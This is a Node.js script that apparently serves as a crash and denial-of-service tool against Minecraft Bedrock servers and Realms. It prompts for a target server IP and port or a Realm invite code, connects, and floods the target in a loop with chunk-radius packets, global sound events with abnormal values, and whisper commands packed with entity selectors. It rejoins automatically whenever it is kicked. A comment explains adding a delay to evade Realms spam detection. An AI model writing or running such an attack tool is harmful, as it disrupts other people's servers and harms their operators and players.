const protocol = require("bedrock-protocol");
const onErrorCB = [];
const onError = (callback) => onErrorCB.push(callback);

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const runCommand = (client, command) => {
    client.write('command_request', {
        command: command,
        origin: {
            type: 5,
            uuid: '',
            request_id: '',
        },
        internal: false,
        version: 66,
    });
};

const levelSoundEvent = (client, data) => {
    client.write('level_sound_event', data);
};


/**
 * @param {protocol.ClientOptions} options
 * @param {Number} s
 * @param {Number} start
 * @return {Promise<{ success: boolean, embed: discord.EmbedBuilder }>}
 */
const crash = async (options) => {
    const delay = !!options.delay;
    async function run()  {

        let client = new protocol.createClient(options);
        async function disconnected(data = "None"){
            if (Date.now() - this.lastCall < 2000) return;
            this.lastCall = Date.now();
            // if (client.connection.connected || client.status !== 0) return; // already rejoined
            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} disconnected!`, data);
            await client.removeAllListeners();
            if (data === 'disconnectionScreen.serverIdConflict') await wait(1000);
            await wait(100);
            run();
            // clear this function from the event listeners
        }
        onError((e) => {
            console.error(e);
        });

        client.on("kick", async (packet) => {
            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} kicked!`, packet);
            return disconnected(packet);
        });

        client.on("disconnect", async (packet) => {
            if (packet === 'disconnectionScreen.serverIdConflict') return disconnected(packet);
            return disconnected(packet);
        });

        client.on("play_status", async (data) => {
            if (data.status !== "login_success") return;
            await wait(3);
            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} joined! Sending packets...`);
            let i = 0;
            while (i < (delay ? 99 : 999)) {
                const pos = data.player_position ?? {
                    x: 0,
                    y: 0,
                    z: 0,
                };
                client.write("chunk_radius_update", { // dont know if this actually does anything lol
                    chunk_radius: 500
                })
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: -1,
                    sound_id: "Death",
                    entity_type: "minecraft:ender_dragon",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: 637546,
                    sound_id: "Splash",
                    entity_type: "",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    sound_id: "BundleRemoveOne",
                    entity_type: "",
                    position: pos,
                    is_global: true,
                    extra_data: -1124852450,
                    is_baby_mob: false,
                });
                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}\n`);
                i++;
                if (delay) await wait(options.delay);
            }
            await client.close("Finished sending ${i} packets! Rejoining to repeat...")
            disconnected(`Finished sending ${i} packets! Rejoining to repeat...`);
        });
    }
    run()
};

/** @type {protocol.ClientOptions} */
const options = require("./config.json");
process.on("uncaughtException", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

process.on("unhandledRejection", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});
const cin = () => new Promise((resolve) => {
    process.stdin.once("data", (data) => resolve(data.toString().trim()));
})
console.log(`Select A Target Type\n1. Realm | 2. Server`);
cin().then(async input => {
    if (input === "1") {
        console.log(`Enter Realm Code`);
        cin().then(input => {
            (options.realms ??= {}).realmInvite = input;
            options.delay = 10; // adds a delay since realms will flag you for spam
            crash(options);
        })
        return;
    }
    console.log(`Enter Server IP`);
    options.host = await cin();
    console.log(`Enter Server Port`);
    options.port = parseInt(await cin())
    crash(options);
})
